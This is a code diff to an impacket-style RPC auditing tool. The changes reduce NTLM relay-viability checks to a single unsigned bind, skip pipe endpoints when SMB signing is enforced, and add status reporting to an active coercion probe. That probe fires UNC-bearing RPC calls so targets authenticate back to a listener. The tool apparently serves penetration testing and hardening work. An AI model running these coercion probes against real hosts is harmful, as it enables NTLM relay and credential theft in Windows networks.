@@ -1165,28 +1165,36 @@ class RPCAuthMap(object):
 
     # ---- STAGE 3 : relay-destination auth floor -------------------------- #
     def probe_floor(self, stringbinding, uuid_str, ver='1.0'):
-        """Lowest auth level the endpoint accepts at bind, or None."""
-        for name, level in AUTH_LEVELS:
-            try:
-                rpctransport = transport.DCERPCTransportFactory(stringbinding)
-                rpctransport.set_connect_timeout(self.timeout)
-                if name != 'none':
-                    self._set_creds(rpctransport)
-                dce = rpctransport.get_dce_rpc()
-                if name != 'none':
-                    dce.set_auth_type(RPC_C_AUTHN_WINNT)
-                    dce.set_auth_level(level)
-                dce.connect()
-                try:
-                    dce.bind(uuidtup_to_bin((uuid_str, ver)))
-                except Exception:
-                    dce.disconnect()
-                    continue
-                dce.disconnect()
-                return name
-            except Exception:
-                continue
-        return None
+        """Relay verdict for one endpoint, in a SINGLE bind.
+
+        A relayed NTLM session is an authenticated bind with no signing, i.e.
+        exactly AUTHN_LEVEL_CONNECT, so we model the relay by trying that one
+        level rather than climbing none/connect/integrity/privacy. Returns:
+          'connect'   -> unsigned authenticated bind accepted => RELAY-VIABLE
+          'protected' -> bind rejected (signing/integrity enforced)
+          None        -> endpoint unreachable (transport failed)
+        This is the main speed lever: one connect+bind per interface, and a dead
+        port costs one timeout instead of four."""
+        try:
+            rpctransport = transport.DCERPCTransportFactory(stringbinding)
+            rpctransport.set_connect_timeout(self.timeout)
+            self._set_creds(rpctransport)
+            dce = rpctransport.get_dce_rpc()
+            dce.set_auth_type(RPC_C_AUTHN_WINNT)
+            dce.set_auth_level(RPC_C_AUTHN_LEVEL_CONNECT)
+            dce.connect()
+        except Exception:
+            return None  # transport unreachable; do not retry other levels
+        try:
+            dce.bind(uuidtup_to_bin((uuid_str, ver)))
+            floor = 'connect'
+        except Exception:
+            floor = 'protected'
+        try:
+            dce.disconnect()
+        except Exception:
+            pass
+        return floor
 
     # ---- STAGE 4 : active coercion probe --------------------------------- #
     def coerce_probe(self, host, descriptor):
@@ -1211,32 +1219,44 @@ class RPCAuthMap(object):
         rpctransport = transport.DCERPCTransportFactory(sb)
         rpctransport.set_connect_timeout(self.timeout)
         self._set_creds(rpctransport)
+        # status: 'confirmed' | 'sent' (reached, no callback) | 'error' (call
+        # faulted in an unexpected way) | 'nobind' (could not even bind the pipe)
         try:
             dce = rpctransport.get_dce_rpc()
             dce.set_auth_type(RPC_C_AUTHN_WINNT)
             dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
             dce.connect()
             dce.bind(uuidtup_to_bin(descriptor['uuidtup']))
-        except Exception:
+        except Exception as e:
+            self._dbg('coerce-bind %s via %s' % (method_name, pipe), host, e)
+            hits.append({'iface': descriptor['label'], 'pipe': pipe,
+                         'method': method_name, 'confirmed': False,
+                         'status': 'nobind',
+                         'reason': str(e).split('\n')[0][:70]})
             return
-        sent_ok = False
+        status = 'error'
+        reason = ''
         try:
             fire(dce, unc, host)
-            sent_ok = True  # no exception: call accepted
+            status = 'sent'
+            reason = 'call accepted (no fault)'
         except Exception as e:
             es = str(e)
+            self._dbg('coerce-fire %s via %s' % (method_name, pipe), host, e)
             if any(code in es for code in _EXPECTED_COERCE_ERRORS):
-                sent_ok = True  # expected post-dial failure == it reached out
+                status = 'sent'
+                reason = 'post-dial error (reached out)'
+            else:
+                status = 'error'
+                reason = es.split('\n')[0][:70]
         finally:
             try:
                 dce.disconnect()
             except Exception:
                 pass
-        if not sent_ok:
-            return
-        # Give the target a moment to dial the listener.
+        # Give the target a moment to dial the listener (only if the call went out).
         confirmed = False
-        if self.listener:
+        if status == 'sent' and self.listener:
             deadline = time.time() + self.coerce_timeout
             while time.time() < deadline:
                 if self.listener.saw(host):
@@ -1245,7 +1265,10 @@ class RPCAuthMap(object):
                 time.sleep(0.25)
         hits.append({
             'iface': descriptor['label'], 'pipe': pipe,
-            'method': method_name, 'confirmed': confirmed,
+            'method': method_name,
+            'confirmed': confirmed,
+            'status': 'confirmed' if confirmed else status,
+            'reason': reason,
         })
 
     # ---- LEVEL-2 : targeted fuzz of discovered interfaces ---------------- #
@@ -1424,10 +1447,21 @@ class RPCAuthMap(object):
             probe_order = [b for b in sb_list if b.startswith('ncacn_ip_tcp')] + \
                           [b for b in sb_list if b.startswith('ncacn_np')]
             remote_reachable = bool(probe_order)
+            # If SMB signing is required, a named-pipe endpoint cannot be relayed
+            # into no matter what its RPC floor is, so skip probing pipes entirely
+            # and only test direct-TCP endpoints. On a signing-required host this
+            # removes almost every bind, which is the bulk of the runtime.
+            if smb_signing is True:
+                probe_set = [b for b in probe_order
+                             if b.startswith('ncacn_ip_tcp')]
+            else:
+                probe_set = probe_order
+            pipe_only_blocked = (smb_signing is True and remote_reachable
+                                 and not probe_set)
             floor = None
             used_sb = None
             if not self.anon:
-                for b in probe_order:
+                for b in probe_set:
                     f = self.probe_floor(b, u, ver)
                     if f is not None:
                         floor = f
@@ -1435,7 +1469,7 @@ class RPCAuthMap(object):
                         break
             relay_viable = floor in RELAY_VIABLE_FLOORS
             is_pipe = bool(used_sb and used_sb.startswith('ncacn_np'))
-            blocked_by_smb = is_pipe and (smb_signing is True)
+            blocked_by_smb = pipe_only_blocked or (is_pipe and smb_signing is True)
             effective_relay = relay_viable and not blocked_by_smb
 
             if effective_relay:
@@ -1449,14 +1483,20 @@ class RPCAuthMap(object):
                 methods = ', '.join(m[0] for m in desc['triggers'])
                 entry = {'uuid': u, 'label': desc['label'],
                          'how': '%s take a UNC/server argument' % methods,
-                         'auto': True, 'confirmed': None}
+                         'auto': True, 'confirmed': None, 'attempted': False,
+                         'fail_reason': ''}
                 if self.do_coerce and not self.fuzz_dry_run:
+                    entry['attempted'] = True
                     hits = self.coerce_probe(host, desc)
                     if any(h['confirmed'] for h in hits):
                         entry['confirmed'] = True
                         coerce_count += 1
-                    elif hits:
-                        entry['confirmed'] = False
+                    elif any(h.get('status') == 'sent' for h in hits):
+                        entry['confirmed'] = False       # reached out, no callback
+                    else:
+                        entry['confirmed'] = None         # could not bind/send
+                        entry['fail_reason'] = next(
+                            (h.get('reason') for h in hits if h.get('reason')), '')
                 coercibles.append(entry)
 
             if self.show_all:
@@ -1471,14 +1511,17 @@ class RPCAuthMap(object):
                 if not remote_reachable:
                     blk.append(c('        local only (ncalrpc) - not reachable '
                                  'over the network, cannot test', C.GREY))
-                elif floor is None:
-                    blk.append(c('        floor: inconclusive (remote bind '
-                                 'failed)', C.GREY))
+                elif pipe_only_blocked:
+                    blk.append(c('        pipe only; SMB signing REQUIRED blocks '
+                                 'pipe relay - not probed', C.GREEN))
                 elif effective_relay:
                     blk.append(c('        floor=%s -> relay VIABLE' % floor, C.RED))
                 elif blocked_by_smb:
-                    blk.append(c('        floor=%s open but SMB signing blocks '
-                                 'pipe relay' % floor, C.GREEN))
+                    blk.append(c('        open but SMB signing blocks pipe relay',
+                                 C.GREEN))
+                elif floor is None:
+                    blk.append(c('        floor: inconclusive (remote bind '
+                                 'failed)', C.GREY))
                 else:
                     blk.append(c('        floor=%s -> protected' % floor, C.GREEN))
                 detail_rows.append(blk)
@@ -1499,15 +1542,18 @@ class RPCAuthMap(object):
                     verdict = c('CONFIRMED', C.BOLD + C.GREEN)
                 elif e['confirmed'] is False:
                     verdict = c('LIKELY (call sent, no callback)', C.YELLOW)
+                elif e.get('attempted'):
+                    verdict = c('CANDIDATE (fire failed)', C.YELLOW)
                 else:
                     verdict = c('CANDIDATE', C.YELLOW)
                 lines.append('     %s  %s  %s'
                              % (verdict, c(e['label'], C.BBLUE),
                                 c(e['uuid'], C.GREY)))
                 lines.append(c('        Why: %s' % e['how'], C.GREY))
-                if not e['auto']:
-                    lines.append(c('        Note: needs a handle sequence, not '
-                                   'auto-fired; trigger with printerbug', C.GREY))
+                if e['confirmed'] is None and e.get('attempted'):
+                    rtxt = e.get('fail_reason') or 'no bind/response'
+                    lines.append(c('        Active fire attempted but did not land: '
+                                   '%s (run with -v for detail)' % rtxt, C.GREY))
         else:
             lines.append(c('     No. No coercible interface exposed.', C.GREEN))
 
